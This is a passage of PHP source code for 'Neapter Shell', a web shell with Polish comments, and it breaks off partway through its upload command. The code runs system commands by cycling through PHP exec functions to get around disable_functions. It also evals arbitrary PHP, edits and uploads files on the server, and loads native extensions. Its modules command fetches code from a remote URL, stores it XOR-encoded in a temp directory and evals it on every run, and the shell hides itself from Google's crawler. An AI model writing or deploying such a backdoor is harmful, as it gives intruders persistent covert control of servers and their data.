<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

require_once dirname( __FILE__ ) . '/Lib/Arr.php';
require_once dirname( __FILE__ ) . '/Lib/Request.php';
require_once dirname( __FILE__ ) . '/Lib/ShellInterface.php';
require_once dirname( __FILE__ ) . '/Lib/LoadModules.php';
require_once dirname( __FILE__ ) . '/Lib/XRecursiveDirectoryIterator.php';

/**
 * class Shell - Zarzadzanie serwerem
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @version 0.41
 *
 * @uses Arr
 * @uses Request
 * @uses Form
 */
class Shell
{
	/**
	 * Wersja
	 */
	const VERSION = '0.50 b121109-dev';

	/**
	 * Help, natywne polecenia
	 */
	const HELP = "help - Wyświetlanie pomocy\r\nmodules - Informacje o modułach\r\nedit - Edycja oraz tworzenie nowego pliku\r\nupload - Wrzucanie pliku na serwer\r\nsystem, exec - Uruchomienie polecenia systemowego\r\ninfo - Wyświetla informacje o systemie\r\nautoload - Automatyczne wczytywanie rozszerzeń PHP\r\neval, php - Wykonanie kodu PHP\r\ncd - Zmiana aktualnego kataloguversion - Wyświetlanie numeru wersji shella\r\nlogout - Wylogowanie z shella (jeśli ustawiono dostęp na hasło)\r\ncr3d1ts - Informacje o autorze\r\n";

	/**
	 * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
	 *
	 * format: sha1( $sUser . "\xff" . $sPass );
	 *
	 * @access private
	 * @var    string
	 */
	private $sAuth;

	/**
	 * Czas generowania strony
	 *
	 * @access private
	 * @var    float
	 */
	private $fGeneratedIn;

	/**
	 * SafeMode ON / OFF
	 *
	 * @access public
	 * @var    boolean
	 */
	public $bSafeMode;

	/**
	 * Tablica wylaczaonych funkcji
	 *
	 * @access private
	 * @var    array
	 */
	private $aDisableFunctions = array();

	/**
	 * Mozliwe jest wykonanie polecenia systemowego ?
	 *
	 * @access private
	 * @var    boolean
	 */
	private $bExec = FALSE;

	/**
	 * Dzialamy w srodowisku Windows ?
	 *
	 * @access public
	 * @var    boolean
	 */
	public $bWindows = FALSE;

	/**
	 * Komenda
	 *
	 * @access public
	 * @var    string
	 */
	public $sCmd;

	/**
	 * Lista parametrow
	 *
	 * @access public
	 * @var    array
	 */
	public $aArgv = array();

	/**
	 * Ilosc parametrow
	 *
	 * @access public
	 * @var    integer
	 */
	public $iArgc = 0;

	/**
	 * Lista opcji
	 *
	 * @access public
	 * @var    array
	 */
	public $aOptv = array();

	/**
	 * Ciag jako jeden wielki parametr
	 *
	 * @access public
	 * @var    string
	 */
	public $sArgv;

	/**
	 * Lista modulow i komend
	 *
	 *  [komenda1] => Modul1
	 *  [komenda2] => Modul2
	 *
	 * @access private
	 * @var    string
	 */
	private $aModules = array();

	/**
	 * Lista natywnych modulow
	 *
	 *  [komenda1] => nazwa_metody1
	 *  [komenda2] => nazwa_metody1
	 *
	 * @access private
	 * @var    string
	 */
	private $aNativeModules = array();

	/**
	 * Lista modulow
	 *
	 *  [Modul] => 'komenda1, komenda2'
	 *
	 * @access private
	 * @var    string
	 */
	private $aHelpModules = array();

	/**
	 * Style CSS
	 *
	 * @ignore
	 * @access private
	 * @var    string
	 */
	private $sStyleSheet;

	/**
	 * Katalog tymczasowy
	 *
	 * @access public
	 * @var    string
	 */
	public $sTmp;

	/**
	 * Funkcje systemowe
	 *
	 * @access public
	 * @var    array
	 */
	public $aSystemFunctions = array
	(
		'exec',
		'shell_exec',
		'passthru',
		'system',
		'popen',
		'proc_open'
	);

	/**
	 * Wlasciwosc potrzeba przy wyswietlaniu pliku pomocy z natywnych modulow
	 * takich jak getCommandEdit(), getCommandUpload() czy getCommandSystem()
	 *
	 * @access private
	 * @var    boolean
	 */
	private $bHelp = FALSE;

	/**
	 * Unikalny klucz dla shella, za pomoca ktorego szyfrowane sa niektore dane
	 *
	 * @ignore
	 * @access public
	 * @var    string
	 */
	public $sKey;

	/**
	 * Specjalny prefix dla shella
	 *
	 * @ignore
	 * @access public
	 * @var    string
	 */
	public $sPrefix;

	/**
	 * Jezeli TRUE to dzialamy w srodowisku deweloperskim (wlaczane wyswietlanie i raportowanie bledow)
	 *
	 * @access public
	 * @var    boolean
	 */
	public $bDev = FALSE;

	/**
	 * Jezeli FALSE to skrypty JavaScript sa wlaczone
	 *
	 * @access public
	 * @var    boolean
	 */
	public $bNoJs = FALSE;

	/**
	 * Konstruktor
	 *
	 * @uses   Request
	 *
	 * @access public
	 * @return void
	 */
	public function __construct()
	{
		/**
		 * Czas generowania strony a w zasadzie shella
		 */
		$this -> fGeneratedIn = microtime( 1 );

		/**
		 * Uwierzytelnianie
		 *
		 * @see self::$sAuth
		 */
		if( defined( 'NF_AUTH' ) && preg_match( '~^[a-f0-9]{40}\z~', NF_AUTH ) )
		{
			$this -> sAuth = NF_AUTH;
		}

		/**
		 * @see Request::init
		 *
		 * Dostep do zmiennych poprzez metody. Nie trzeba za kazdym razem uzywac konstrukcji:
		 *   ( isset( $_GET['test'] ) && ( $_GET['test'] === 'test' ) )
		 * tylko
		 *   ( Request::getGet( 'test' ) === 'test' )
		 */
		Request::init();

		/**
		 * Blokowanie google bota; baidu, bing, yahoo moga byc
		 */
		if( stripos( Request::getServer( 'HTTP_USER_AGENT' ), 'Google' ) !== FALSE )
		{
			header( 'HTTP/1.0 404 Not Found' );
			exit ;
		}

		/**
		 * Locale
		 */
		setLocale( LC_ALL, 'polish.UTF-8' );

		/**
		 * Naglowek UTF-8
		 */
		header( 'Content-type: text/html; charset=utf-8' );

		/**
		 * @ignore
		 */
		$this -> sStyleSheet = file_get_contents( 'Styles/haxior.css' );

		/**
		 *  Sprawdzanie do ktorego katalogu mamy zapis
		 */
		$aTmpDirs = array
		(
			@ $_ENV['TMP'],
			@ $_ENV['TMP'],
			@ $_ENV['TMPDIR'],
			ini_get( 'session.save_path' ).
			ini_get( 'upload_tmp_dir' ),
			ini_get( 'soap.wsdl_cache_dir' ),
			sys_get_temp_dir()
		);

		foreach( $aTmpDirs as $sTmpDir )
		{
			if( is_readable( $sTmpDir ) && is_writable( $sTmpDir ) )
			{
				$this -> sTmp = $sTmpDir;
				break ;
			}
		}

		/**
		 * Tryb deweloperski
		 */
		$this -> bDev = isset( $_GET['dev'] );

		/**
		 * Wylaczenie JavaScript
		 */
		$this -> bNoJs = isset( $_GET['nojs'] );

		/**
		 * disable_functions
		 */
		if( ( $sDisableFunctions = ini_get( 'disable_functions' ) ) !== '' )
		{
			$aDisableFunctions = explode( ',', $sDisableFunctions );

			$this -> aDisableFunctions = array_map( create_function( '$sValue', 'return strtolower( trim( $sValue ) );' ), $aDisableFunctions );
		}

		/**
		 * Czy dzialamy na Windowsie ?
		 */
		$this -> bWindows = ( strncmp( PHP_OS, 'WIN', 3 ) === 0 );

		/**
		 * SafeMode
		 */
		$this -> bSafeMode = (boolean) ini_get( 'safe_mode' );

		/**
		 * Unikalny klucz
		 */
		$this -> sKey = md5( md5_file( $sScriptFilename = Request::getServer( 'SCRIPT_FILENAME' ) ), TRUE ) . md5( $sScriptFilename, TRUE ) . sha1( $sScriptFilename, TRUE );

		/**
		 * Prefix
		 */
		$this -> sPrefix = substr( md5( $sScriptFilename ) . md5_file( $sScriptFilename ), 0, 10 ) . '_';

		/**
		 * Mozliwosc wywolania polecenia systemowego
		 */
		if( function_exists( 'pcntl_exec' ) )
		{
			$this -> aSystemFunctions[] = 'pcntl_exec';
		}

		$this -> bExec = ( ! $this -> bSafeMode && ( count( array_diff( $this -> aSystemFunctions, $this -> aDisableFunctions ) ) > 0 ) );

		/**
		 * Config
		 */
		error_reporting( $this -> bDev ? -1 : 0 );
		ignore_user_abort( 0 );

		/**
		 * Jesli SafeMode jest wylaczony
		 */
		if( ! $this -> bSafeMode )
		{
			ini_set( 'display_errors', (int) $this -> bDev );
			ini_set( 'max_execution_time', 0 );
			ini_set( 'memory_limit', '1024M' );
			ini_set( 'default_socket_timeout', 5 );
			ini_set( 'date.timezone', 'Europe/Warsaw' );
			ini_set( 'html_errors', 0 );
			ini_set( 'log_errors', 0 );
			ini_set( 'error_log', NULL );
		}
		else
		{
			date_default_timezone_set( 'Europe/Warsaw' );
		}

		/**
		 * Uruchomienie shella z domyslna konfiguracja - bez wczytywania ustawien
		 * bez rozszerzen i modulow
		 */
		if( ! isset( $_GET['pure'] ) )
		{
			/**
			 * Wczytywanie modulow
			 */
			if(    is_file( $sFilePath = $this -> sTmp . '/' . $this -> sPrefix . '_modules' )
		            && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
			)
			{
				ob_start();
				eval( '?>' . $this -> decode( $sData ) . '<?' );
				ob_clean();
				ob_end_flush();
			}

			/**
			 * Wczytywanie rozszerzen
			 */
			if(    is_file( $sFilePath = $this -> sTmp . '/' . $this -> sPrefix . '_autoload' )
		            && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
			)
			{
				/**
				 * Unserializacja i deszyfrowanie
				 */
				$aAutoload = unserialize( $this -> decode( $sData ) );

				/**
				 * Wczytywanie rozszerzen
				 */
				foreach( $aAutoload as $sExtension )
				{
					$this -> dl( $sExtension );
				}
			}
		}

		/**
		 * Lista dostepnych modulow natywnych
		 */
		$oReflection = new ReFlectionClass( 'shell' );
		$aHelpModules = $oReflection -> getMethods();

		foreach( $aHelpModules as $oMethod )
		{
			$sMethod = $oMethod -> getName();

			if( ! ( ( strncasecmp( $sMethod, 'getCommand', 10 ) === 0 ) && ( $sMethod !== 'getCommandCr3d1ts' ) ) )
			{
				continue ;
			}
			$this -> aNativeModules[ strtolower( substr( $sMethod, 10 ) ) ] = $sMethod;
		}

		/**
		 * Lista dostepnych modulow zewnetrznych
		 */
		$aClasses = get_declared_classes();

		foreach( $aClasses as $sClass )
		{
			/**
			 * Wyszukiwanie klas z prefixem Module
			 */
			if( ( strncmp( $sClass, 'Module', 6 ) === 0 ) && ( $sClass !== 'ModuleDummy' ) )
			{
				$oModule = new $sClass( $this );

				/**
				 * Klasa musi implementowac ShellInterface
				 */
				if( $oModule instanceof ShellInterface )
				{
					$aCommands = $oModule -> getCommands();

					foreach( $aCommands as $sCommand )
					{
						$this -> aModules[ $sCommand ] = $sClass;
					}

					$this -> aHelpModules[ $sClass ] = implode( ', ', $aCommands );
				}
			}
		}

		/**
		 * Chdir
		 */
		if(     is_file( $sFile = $this -> sTmp . '/' . $this -> sPrefix . 'chdir' )
		   && ( ( $sData = file_get_contents( $sFile ) ) !== FALSE )
		)
		{
			chdir( $this -> decode( $sData ) );
		}
	}

	/**
	 * Proste szyfrowanie ciągu z uzyiem XOR
	 *
	 * @param  string $sData Tekst do zaszyfrowania
	 * @param  string $sKey  [Optional]Klucz
	 * @return string        Zaszyfrowany ciag
	 */
	public function encode( $sData, $sKey = NULL )
	{
		/**
		 * Domyslny klucz
		 */
		if( $sKey === NULL )
		{
			$sKey = $this -> sKey;
		}

		/**
		 * Musza wystepowac jakies dane
		 */
		if( ( $iDataLen = strlen( $sData ) ) === 0 )
		{
			return NULL;
		}

		$iKeyLen = strlen( $sKey );

		$sNewData = NULL;

		/**
		 * Szyfrowanie
		 */
		for( $i = 0; $i < $iDataLen; ++$i )
		{
			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, $i % $iKeyLen, 2 ) ) );
		}

		return gzcompress( $sNewData, 9 );
	}

	/**
	 * Proste deszyfrowanie ciągu z uzyiem XOR
	 *
	 * @param  string $sData Tekst do deszyfracji
	 * @param  string $sKey  [Optional]Klucz
	 * @return string        Zdeszyfrowany ciag
	 */
	public function decode( $sData, $sKey = NULL )
	{
		/**
		 * Domyslny klucz
		 */
		if( $sKey === NULL )
		{
			$sKey = $this -> sKey;
		}

		/**
		 * Musza wystepowac jakies dane
		 */
		if( strlen( $sData ) === 0 )
		{
			return NULL;
		}

		$sData = gzuncompress( $sData );
		$iDataLen = strlen( $sData );

		$iKeyLen = strlen( $sKey );

		$sNewData = NULL;

		/**
		 * Deszyfrowanie
		 */
		for( $i = 0; $i < $iDataLen; ++$i )
		{
			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, $i % $iKeyLen, 2 ) ) );
		}

		return $sNewData;
	}

	/**
	 * Wczytanie rozszerzenia
	 *
	 * @access public
	 * @param  string  $sExtension Nazwa rozszerzenia lub sciezka do pliku
	 * @return boolean             TRUE w przypadku pomyslnego zaladowania biblioteki
	 */
	public function dl( $sExtension )
	{
		/**
		 * Nazwa rozszerzenia
		 */
		$sName = basename( $sExtension );

		if( ( $iPos = strrpos( $sName, '.' ) ) !== FALSE )
		{
			$sName = substr( $sName, 0, $iPos - 1 );
		}
		else
		{
			$sExtension .= ( $this -> bWindows ? '.dll' : '.so' );
		}

		/**
		 * Czy rozszerzenie jest juz zaladowane
		 */
		if( extension_loaded( $sName ) )
		{
			return TRUE;
		}

		/**
		 * Aby `dl` dzialalo poprawnie wymagane jest wylaczone safe_mode,
		 * wlaczenie dyrektywy enable_dl. Funkcja `dl` musi istniec
		 * i nie moze znajdowac sie na liscie wylaczonych funkcji
		 */
		if( ! $this -> bSafeMode && function_exists( 'dl' ) && ini_get( 'enable_dl' ) && ! in_array( 'dl', $this -> aDisableFunctions ) )
		{
			return dl( $sExtension );
		}

		return FALSE;
	}

	/**
	 * Zwracanie nazwy hosta i portu
	 *
	 * @access private
	 * @param  integer $sHost Host / Host:port
	 * @return array          Host i port
	 */
	public function getHost( $sHost )
	{
		$iPort = 0;
		if( strpos( $sHost, ':' ) !== FALSE )
		{
			list( $sHost, $iPort ) = explode( ':', $sHost );
		}

		return array( $sHost, (int) $iPort );
	}

	/**
	 * Pobieranie statusu TAK / NIE
	 *
	 * @access private
	 * @param  boolean $bValue    Wartosc
	 * @param  boolean $bNegative Negacja 1, 0 zwroci zielone TAK, 1, 1 zwroci czerwone TAK
	 * @return string             Status
	 */
	private function getStatus( $bValue, $bNegative = FALSE )
	{
		return sprintf( '<span class="%s">%s</span>', ( ( $bNegative ? ! $bValue : $bValue ) ? 'green' : 'red' ), ( $bValue ? 'TAK' : 'NIE' ) );
	}

	/**
	 * Pobieranie menu
	 *
	 * @access private
	 * @return string  Menu w HTMLu
	 */
	private function getMenu()
	{
		return sprintf( 'Wersja PHP: <strong>%s</strong><br/>' .
				'SafeMode: %s<br/>' .
				'OpenBaseDir: <strong>%s</strong><br/>' .
				'Serwer Api: <strong>%s</strong><br/>' .
				'Serwer: <strong>%s</strong><br/>' .
				'TMP: <strong>%s</strong><br/>' .
				'Zablokowane funkcje: <strong>%s</strong><br/>',

				phpversion(),
				$this -> getStatus( $this -> bSafeMode, TRUE ),
				( ( ( $sBasedir = ini_get( 'open_basedir' ) ) === '' ) ? $this -> getStatus( 0, TRUE ) : $sBasedir ),
				php_sapi_name(),
				php_uname(),
				$this -> sTmp,
				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'Brak' : $sDisableFunctions )
		);
	}

	/**
	 * Komenda - modules
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandModules()
	{
		/**
		 * Help
		 */
		if( $this -> bHelp || ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
modules - Informacje o modułach

	Użycie:
		modules loaded - lista załadowanych modułów - polecenia
		modules version - wyświetlanie wersji modułów

		modules ścieżka_do_pliku_z_modułami

	Przykład:
		modules loaded
		modules version
		modules /tmp/modules
		modules http://example.com/modules.txt
DATA;
		}

		/**
		 * Lista dostepnych modulow
		 */
		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'loaded' ) )
		{
			$aModules = array_merge( array_keys( $this -> aNativeModules ),
				array_map(
					create_function( '$sVal', 'return strtolower( substr( $sVal, 6 ) );' ),	array_keys( $this -> aHelpModules )
				)
			);

			sort( $aModules );

			return sprintf( "Załadowano %s modułów:\r\n\t%s", count( $aModules ), implode( "\r\n\t", $aModules ) );
		}

		/**
		 * Wyswietlanie wersji bibliotek
		 */
		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'version' ) )
		{
			/**
			 * Szukanie najdluzszej nazwy modulu
			 */
			$iMaxLen = 0;
			foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
			{
				if( ( $iLen = strlen( $sModule ) ) > $iMaxLen )
				{
					$iMaxLen = $iLen;
				}
			}

			/**
			 * Wersja modulu
			 */
			$sOutput = NULL;
			foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
			{
				$oModule = new $sModule( $this );

				$sOutput .= str_pad( $sModule, $iMaxLen, ' ' ) . ' - ' . $oModule -> getVersion() . "\r\n";
			}

			return htmlspecialchars( $sOutput );
		}

		/**
		 * Pobieranie pliku z http
		 */
		if( strncmp( $this -> aArgv[0], 'http://', 7 ) === 0 )
		{
			if( ( $sData = file_get_contents( $this -> aArgv[0] ) ) === FALSE )
			{
				return 'Nie można pobrać pliku z modułami';
			}
		}
		/**
		 * Wczytywanie pliku
		 */
		else
		{
			if( ! ( is_file( $this -> aArgv[0] ) && ( ( $sData = file_get_contents( $this -> aArgv[0] ) ) !== FALSE ) ) )
			{
				return 'Nie można wczytać pliku z modułami';
			}
		}

		/**
		 * Szyfrowanie zawartosci pliku
		 */
		file_put_contents( $this -> sTmp . '/' . $this -> sPrefix . '_modules', $this -> encode( $sData ) );

		header( 'Refresh:1;url=' . Request::getCurrentUrl() );

		return 'Plik z modułami został załadowany';
	}

	private function getCommandCr3d1ts()
	{
		return <<<DATA
Jakieś sugestie, pytania?
	Pisz śmiało: Krzychu - <a href="mailto:krzotr@gmail.com">krzotr@gmail.com</a>
DATA;
	}

	/**
	 * Komenda - help
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandHelp()
	{
		if( $this -> bHelp )
		{
			return <<<DATA
help - Wyświetlanie pomocy

	Użycie:
		help
DATA;
		}

		$iMaxLen = 0;

		/**
		 * Szukanie najdluzszego ciagu (najdluzsza komenda)
		 */
		foreach( $this -> aHelpModules as $sModuleCmd )
		{
			if( ( $iLen = strlen( $sModuleCmd ) ) > $iMaxLen )
			{
				$iMaxLen = $iLen;
			}
		}

		$sOutput = NULL;

		/**
		 * Formatowanie natywnego helpa
		 */
		$aHelp = array_filter( preg_split( '~\r\n|\n|\r~', self::HELP ) );

		/**
		 * Szukanie najdluzszego ciagu (najdluzsza komenda)
		 */
		if( $iMaxLen === 0 )
		{
			foreach( $aHelp as $sLine )
			{
				if( ( $iLen = strpos( $sLine, '-' ) ) > $iMaxLen )
				{
					$iMaxLen = $iLen;
				}
			}
		}

		/**
		 * Formatowanie naglowkow z natywnych modulow
		 */
		foreach( $aHelp as $sLine )
		{
			$iPos = strpos( $sLine, '-' );

			$sOutput .= str_pad( substr( $sLine, 0, $iPos ), $iMaxLen, ' ' ) . rtrim( substr( $sLine, $iPos -  1 ) ) . "\r\n";
		}

		/**
		 * Formatowanie naglowkow z zewnetrznych modulow
		 */
		foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
		{
			$oModule = new $sModule( $this );

			$sHelp = $oModule -> getHelp();

			$iPos = ( ( ( $iPos = strpos( $sHelp, "\n" ) ) !== FALSE ) ? $iPos : strlen( $sHelp ) );
			$sOutput .= str_pad( $sModuleCmd, $iMaxLen, ' ' ) . ' - ' . trim( substr( $sHelp, 0, $iPos ) ) . "\r\n";
		}

		$sOutput .= "\r\n\r\n";

		/**
		 * Wymuszenie uzycia pliku pomocy dla natywnych polecen
		 */
		$this -> bHelp = TRUE;

		/**
		 * Szczegolowa pomoc
		 */
		if( isset( $this -> aArgv[0] ) && ( $this -> aArgv[0] === 'all' ) )
		{
			/**
			 * Formatowanie natywnych helpow
			 */
			foreach( $this -> aNativeModules as $sModule => $sMethod  )
			{
				$sOutput .= $this -> $sMethod( TRUE )  . "\r\n\r\n\r\n";
			}

			foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
			{
				$oModule = new $sModule( $this );

				$sOutput .= $sModuleCmd . ' - ' . $oModule -> getHelp() . "\r\n\r\n\r\n";
			}
		}

		/**
		 * Wylaczenie uzycia pliku pomocy dna natywnych polecen
		 */
		$this -> bHelp = FALSE;

		return htmlspecialchars( substr( $sOutput, 0, -6 ) );
	}

	/**
	 * Komenda - autoload
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandAutoload()
	{
		if( $this -> bHelp  || ( ( $this -> iArgc === 0 ) && ( $this -> aOptv === array() ) ) )
		{
			return <<<DATA
Wczytywanie rozszerzeń PHP

	Rozszerzenia te wczytywane są za każdym razem podczas startu

	Użycie:
		autoload -l - wyświetlanie rozszerzen, które zostały wczytane
		autoload -f - odłączenie wszystkich rozszerzen
		autoload nazwa_rozszerzenia [sciezka_do_rozszerzenia rozszerzenie]

	Przykład:
		autoload imap
DATA;
		}

		/**
		 * Lista poprzednio wczytanych rozszerzen
		 */
		$aAutoload = array();

		if(    is_file( $sFilePath = $this -> sTmp . '/' . $this -> sPrefix . '_autoload' )
		    && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
		)
		{
			$aAutoload = unserialize( $this -> decode( $sData ) );
		}

		/**
		 * List
		 */
		if( in_array( 'l', $this -> aOptv ) )
		{
			if( $aAutoload === array() )
			{
				return 'Nie wczytano żadnych rozszerzeń';
			}

			/**
			 * Wczytywanie rozszerzen
			 */
			$sOutput = NULL;

			foreach( $aAutoload as $sExtension )
			{
				$sOutput .= $sExtension . "\r\n";
			}

			return "Wczytane rozszerzenia:\r\n\r\n" . $sOutput;
		}

		/**
		 * Flush
		 */
		if( in_array( 'f', $this -> aOptv ) )
		{
			return sprintf( 'Plik z rozszerzeniami %szostał usunięty', ! unlink( $this -> sTmp . '/' . $this -> sPrefix . '_autoload' ) ? 'nie ' : NULL );
		}

		/**
		 * Wczytywanie rozszerzen
		 */
		$sOutput = NULL;

		foreach( $this -> aArgv as $sExtension )
		{
			/**
			 * Czy rozszerzenie zostalo juz poprzednio wczytane
			 */
			if( in_array( $sExtension, $aAutoload ) )
			{
				$sOutput .= sprintf( "Poprzednio wczytany - %s\r\n", $sExtension );
				continue ;
			}

			/**
			 * Wczytywanie rozszerzenia
			 */
			if( ( $bLoaded = $this -> dl( $sExtension ) ) )
			{
				$aAutoload[] = $sExtension;
			}

			$sOutput .= sprintf( "%s - %s\r\n", ( $bLoaded ? '    Wczytano' : 'Nie wczytano' ), $sExtension );
		}

		/**
		 * Zapis rozszerzen do pliku
		 */
		file_put_contents( $this -> sTmp . '/' . $this -> sPrefix . '_autoload', $this -> encode( serialize( $aAutoload ) ) );

		return $sOutput;
	}

	/**
	 * Komenda - eval
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandEval()
	{
		if( $this -> bHelp  || ( $this -> iArgc === 0 ) )
		{
			return <<<DATA
Wykonanie kodu PHP

	Użycie
		eval skrypt_php

	Przykład
		eval echo md5( 'test' );
DATA;
		}

		ob_start();
		eval( $this -> sArgv );
		$sData = ob_get_contents();
		ob_clean();
		ob_end_flush();

		return htmlspecialchars( $sData );
	}

	/**
	 * Komenda - cd
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandCd()
	{
		if( $this -> bHelp  || ( $this -> iArgc !== 1 ) )
		{
			return <<<DATA
Zmiana aktualnego katalogu

	Użycie:
		cd sciezka

	Przykład:
		cd /tmp
DATA;
		}

		if( chdir( $this -> sArgv ) )
		{
			file_put_contents( $this -> sTmp . '/' . $this -> sPrefix . 'chdir', $this -> encode( $this -> sArgv ) );

			return sprintf( "Katalog zmieniono na:\r\n\t%s", getcwd() );
		}

		return 'Nie udało się zmienić katalogu!!!';
	}

	/**
	 * Wykonanie polecenia systemowago
	 *
	 * @access public
	 * @param  string $sCmd Komenda
	 * @return string
	 */
	public function getCommandSystem( $sCmd )
	{
		if( $this -> bHelp )
		{
			return <<<DATA
system - Uruchomienie polecenia systemowego

	Użycie:
		system polecenie - uruchomienie polecenia

	Przykład:
		system ls -la
DATA;
		}

		/**
		 * Jezeli safemode jest wylaczony
		 */
		if( ! $this -> bSafeMode )
		{
			if( strncmp( $sCmd, 'cd ', 3 ) === 0 )
			{
				chdir( substr( $sCmd, 3 ) );
			}

			ob_start();
			/**
			 * system
			 */
			if( ! in_array( 'system', $this -> aDisableFunctions ) )
			{
				echo "system():\r\n\r\n";
				system( $sCmd );
			}
			/**
			 * shell_exec
			 */
			else if( ! in_array( 'shell_exec', $this -> aDisableFunctions ) )
			{
				echo "shell_exec():\r\n\r\n";
				echo shell_exec( $sCmd );
			}
			/**
			 * passthru
			 */
			else if( ! in_array( 'passthru', $this -> aDisableFunctions ) )
			{
				echo "passthru():\r\n\r\n";
				passthru( $sCmd );
			}
			/**
			 * exec
			 */
			else if( ! in_array( 'exec', $this -> aDisableFunctions ) )
			{
				echo "exec():\r\n\r\n";
				exec( $sCmd, $aOutput );
				echo implode( "\r\n", $sLine ) . "\r\n";
			}
			/**
			 * popen
			 */
			else if( ! in_array( 'popen', $this -> aDisableFunctions ) )
			{
				echo "popen():\r\n\r\n";
				$rFp = popen( $sCmd, 'r' );

				if( is_resource( $rFp ) )
				{
					while( ! feof( $rFp ) )
					{
						echo fread( $rFp, 1024 );
					}
				}
			}
			/**
			 * proc_open
			 */
			else if( ! in_array( 'proc_open', $this -> aDisableFunctions ) )
			{
				echo "proc_open():\r\n\r\n";
				$rFp = proc_open( $sCmd, array
					(
						array( 'pipe', 'r' ),
						array( 'pipe', 'w' )
					),
					$aPipe
				);

				if( is_resource( $rFp ) )
				{
					while( ! feof( $aPipe[1] ) )
					{
						echo fread( $aPipe[1], 1024 );
						usleep( 10000 );
					}
				}
			}
			/**
			 * pcntl_exec
			 */
			else if( function_exists( 'pcntl_exec' ) && ! in_array( 'pcntl_exec', $this -> aDisableFunctions ) )
			{
				echo "pcntl_exec():\r\n\r\n";
				$sPath = NULL;
				$aArgs = array();
				if( ( $iPos = strpos( $sCmd, ' ') ) === FALSE )
				{
					$sPath = $sCmd;
				}
				else
				{
					$sPath = substr( $sCmd, 0, $iPos );
					$aArgs = explode( ' ', substr( $sCmd, $iPos + 1 ) );
				}
				pcntl_exec( $sPath, $aArgs );
			}
			else
			{
				echo 'Wszystkie funkcje systemowe są poblokowane !!!';
			}

			$sData = ob_get_contents();
			ob_clean();
			ob_end_flush();

			return htmlspecialchars( $sData );
		}

		return 'Safe mode jest włączone, funkcje systemowe nie działają !!!';
	}

	/**
	 * Edycja pliku
	 *
	 * @access private
	 * @param  string         $sCmd Sciezka do pliku
	 * @return string|boolean
	 */
	private function getCommandEdit( $sFile )
	{
		/**
		 * Help
		 */
		if( $this -> bHelp || ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
edit - Edycja oraz tworzenie nowego pliku

	Użycie:
		edit /etc/passwd
		edit /sciezka/do/nowego/pliu
DATA;
		}

		/**
		 * Zapis do pliku
		 */
		if( ( $sFiledata = Request::getPost( 'filedata' ) ) !== FALSE )
		{
			return (boolean) file_put_contents( $sFile, $sFiledata );
		}

		/**
		 * Formularz
		 */
		return sprintf( '<form action="%s" method="post">' .
			'<textarea id="console" name="filedata">%s</textarea><br/>' .
			'<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
			'<input type="submit" name="submit" value="Zapisz" id="cmd-send"/></form>',
			Request::getCurrentUrl(),
			( ( is_file( $sFile ) && is_readable( $sFile ) ) ? file_get_contents( $sFile ) : NULL ),
			htmlspecialchars( Request::getPost( 'cmd' ) )
		);
	}

	/**
	 * Wylogowanie
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandLogout()
	{
		/**
		 * Help
		 */
		if( $this -> bHelp )
		{
			return <<<DATA
logout - Wylogowanie z shella (jeśli ustawiono dostęp na hasło)

	Użycie:
		logout
DATA;
		}

		/**
		 * Sciezka do pliku
		 */
		$sFilepath = $this -> sTmp . '/' . $this -> sPrefix . md5( Request::getServer( 'REMOTE_ADDR' ) . Request::getServer( 'USER_AGENT' ) ) . '_auth';

		/**
		 * Czy plik z autoryzacja istnieje
		 */
		if( is_file( $sFilepath ) )
		{
			/**
			 * Usuwanie pliku
			 */
			if( unlink( $sFilepath ) )
			{
				return 'Zostałeś wylogowany';
			}
			else
			{
				return 'Nie zostałeś wylogowany';
			}
		}

		return 'Nie jesteś zalogowany, więc nie możesz się wylogować !!!';
	}

	/**
	 * Version
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandVersion()
	{
		/**
		 * Help
		 */
		if( $this -> bHelp )
		{
			return <<<DATA
version - Wyświetlanie numeru wersji shell'a

	Użycie:
		version
DATA;
		}

		return self::VERSION;

	}

	/**
	 * Wrzucanie pliku
	 *
	 * @access private
	 * @param  string         $sCmd Sciezka do pliku
	 * @return string|boolean
	 */
	private function getCommandUpload( $sFile )
	{
		/**
		 * Help
		 */
		if( $this -> bHelp || ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
upload - Wrzucanie pliku na serwer

	Użycie:
		upload /tmp/plik.php
DATA;
		}

		/**
		 * Zapis do pliku
		 */
		if( ( $aFiledata = Request::getFiles( 'file' ) ) !== FALSE )
		{
			return move_uploaded_file( $aFiledata['tmp_name'], $sFile );
		}
		/**
		 * Formularz
		 */
		return sprintf( '<form action="%s" method="post" enctype="multipart/form-data">' .
			'<pre id="console"><h1>Wrzuć plik</h1><input type="file" name="file"/></pre>' .
			'<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
			'<input type="submit" name="submit" value="Wrzuć" id="cmd-send"/></form>',
			Request::getCurrentUrl(),
